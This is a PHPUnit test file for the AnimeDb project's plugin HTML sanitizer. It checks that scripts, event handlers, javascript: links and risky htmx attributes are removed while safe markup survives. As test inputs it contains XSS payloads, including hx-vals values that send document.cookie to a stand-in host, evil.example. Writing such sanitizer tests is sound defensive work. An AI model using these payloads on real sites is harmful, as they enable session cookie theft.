<?php

/**
 * AnimeDb package.
 *
 * @author    Peter Gribanov <info@peter-gribanov.ru>
 * @copyright Copyright (c) 2026, Peter Gribanov
 * @license   https://www.gnu.org/licenses/gpl-3.0.html GPL-3.0-or-later
 */

/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

declare(strict_types=1);

namespace App\Tests\Unit\Service\Plugin;

use App\Service\Plugin\PluginHtmlSanitizer;
use PHPUnit\Framework\TestCase;

final class PluginHtmlSanitizerTest extends TestCase
{
    private PluginHtmlSanitizer $sanitizer;

    protected function setUp(): void
    {
        $this->sanitizer = new PluginHtmlSanitizer();
    }

    public function testScriptTagIsRemoved(): void
    {
        $result = $this->sanitizer->sanitize('<div>Hello<script>alert(1)</script></div>');

        $this->assertStringNotContainsString('<script', $result);
        $this->assertStringNotContainsString('alert(1)', $result);
    }

    public function testStyleTagIsRemoved(): void
    {
        $result = $this->sanitizer->sanitize('<div>Hello<style>body{display:none}</style></div>');

        $this->assertStringNotContainsString('<style', $result);
        $this->assertStringNotContainsString('display:none', $result);
    }

    public function testEventHandlerAttributeIsRemoved(): void
    {
        $result = $this->sanitizer->sanitize('<button type="button" onclick="alert(1)">Click</button>');

        $this->assertStringNotContainsString('onclick', $result);
        $this->assertStringNotContainsString('alert(1)', $result);
    }

    public function testHxOnAttributeIsRemovedEvenThoughItMatchesTheHxPrefix(): void
    {
        $result = $this->sanitizer->sanitize('<button type="button" hx-on:click="alert(1)" hx-on="click: alert(2)">Click</button>');

        $this->assertStringNotContainsString('hx-on', $result);
        $this->assertStringNotContainsString('alert(1)', $result);
        $this->assertStringNotContainsString('alert(2)', $result);
    }

    public function testHxValsIsRemovedEvenWithoutAJsPrefixBecauseItMatchesTheHxDenylist(): void
    {
        $html = '<div hx-get="/health" hx-trigger="load" '
            .'hx-vals="js:fetch(\'https://evil.example/?c=\'+document.cookie)">content</div>';

        $result = $this->sanitizer->sanitize($html);

        $this->assertStringContainsString('hx-get="/health"', $result);
        $this->assertStringContainsString('hx-trigger="load"', $result);
        $this->assertStringNotContainsString('hx-vals', $result);
        $this->assertStringNotContainsString('evil.example', $result);
        $this->assertStringNotContainsString('document.cookie', $result);
    }

    public function testHxHeadersAndHxVarsAreAlsoRemoved(): void
    {
        $html = '<div hx-get="/health" hx-headers=\'js:{"X":document.cookie}\' hx-vars="js:alert(1)">content</div>';

        $result = $this->sanitizer->sanitize($html);

        $this->assertStringContainsString('hx-get="/health"', $result);
        $this->assertStringNotContainsString('hx-headers', $result);
        $this->assertStringNotContainsString('hx-vars', $result);
        $this->assertStringNotContainsString('document.cookie', $result);
        $this->assertStringNotContainsString('alert(1)', $result);
    }

    public function testDataHxValsAliasIsAlsoRemoved(): void
    {
        $html = '<div hx-get="/health" data-hx-vals="js:fetch(\'https://evil.example\')">content</div>';

        $result = $this->sanitizer->sanitize($html);

        $this->assertStringContainsString('hx-get="/health"', $result);
        $this->assertStringNotContainsString('hx-vals', $result);
        $this->assertStringNotContainsString('evil.example', $result);
    }

    public function testJavascriptSchemeInHrefIsRemoved(): void
    {
        $result = $this->sanitizer->sanitize('<a href="javascript:alert(1)">Link</a>');

        $this->assertStringNotContainsString('javascript:', $result);
    }

    public function testHtmxAttributesSurviveUnchanged(): void
    {
        $html = '<form hx-post="/settings/save" hx-target="#animedb-shikimori-settings" hx-swap="outerHTML"></form>';

        $result = $this->sanitizer->sanitize($html);

        $this->assertStringContainsString('hx-post="/settings/save"', $result);
        $this->assertStringContainsString('hx-target="#animedb-shikimori-settings"', $result);
        $this->assertStringContainsString('hx-swap="outerHTML"', $result);
    }

    public function testHtmxAttributeBeyondTheThreeCommonOnesAlsoSurvives(): void
    {
        $html = '<div hx-trigger="load" hx-indicator="#spinner" hx-boost="true">content</div>';

        $result = $this->sanitizer->sanitize($html);

        $this->assertStringContainsString('hx-trigger="load"', $result);
        $this->assertStringContainsString('hx-indicator="#spinner"', $result);
        $this->assertStringContainsString('hx-boost="true"', $result);
    }

    public function testDataAttributesSurvive(): void
    {
        $result = $this->sanitizer->sanitize('<div data-plugin-id="animedb-shikimori" data-state="open">content</div>');

        $this->assertStringContainsString('data-plugin-id="animedb-shikimori"', $result);
        $this->assertStringContainsString('data-state="open"', $result);
    }

    public function testCommonPluginAttributesSurvive(): void
    {
        $html = '<form action="/settings/plugins/animedb-shikimori/save" method="post" class="settings-form" id="f">'
            .'<label for="endpoint">Endpoint</label>'
            .'<input type="text" id="endpoint" name="api_endpoint" value="https://shikimori.io" placeholder="https://shikimori.io">'
            .'<button type="submit">Save</button>'
            .'</form>';

        $result = $this->sanitizer->sanitize($html);

        $this->assertStringContainsString('action="/settings/plugins/animedb-shikimori/save"', $result);
        $this->assertStringContainsString('method="post"', $result);
        $this->assertStringContainsString('class="settings-form"', $result);
        $this->assertStringContainsString('id="f"', $result);
        $this->assertStringContainsString('for="endpoint"', $result);
        $this->assertStringContainsString('name="api_endpoint"', $result);
        $this->assertStringContainsString('value="https://shikimori.io"', $result);
        $this->assertStringContainsString('placeholder="https://shikimori.io"', $result);
        $this->assertStringContainsString('type="submit"', $result);
    }

    public function testAuthorizeLinkStaysAPlainTopLevelNavigation(): void
    {
        $html = '<a href="/plugin/animedb-shikimori/oauth/start">Authorize</a>';

        $result = $this->sanitizer->sanitize($html);

        $this->assertSame($html, $result);
        $this->assertStringNotContainsString('hx-', $result);
    }

    public function testWidgetCardMarkupSurvives(): void
    {
        $html = '<ul class="plugin-widget__list"><li>'
            .'<a class="anime-card" href="https://shikimori.io/animes/1" target="_blank" rel="noopener noreferrer">'
            .'<img class="anime-card__thumb" src="app-media://anime/1/cover.webp" alt="Frieren" loading="lazy">'
            .'<bdi>Frieren</bdi>'
            .'</a></li></ul>';

        $result = $this->sanitizer->sanitize($html);

        $this->assertStringContainsString('href="https://shikimori.io/animes/1"', $result);
        $this->assertStringContainsString('target="_blank"', $result);
        $this->assertStringContainsString('rel="noopener noreferrer"', $result);
        $this->assertStringContainsString('src="app-media://anime/1/cover.webp"', $result);
        $this->assertStringContainsString('<bdi>Frieren</bdi>', $result);
    }
}
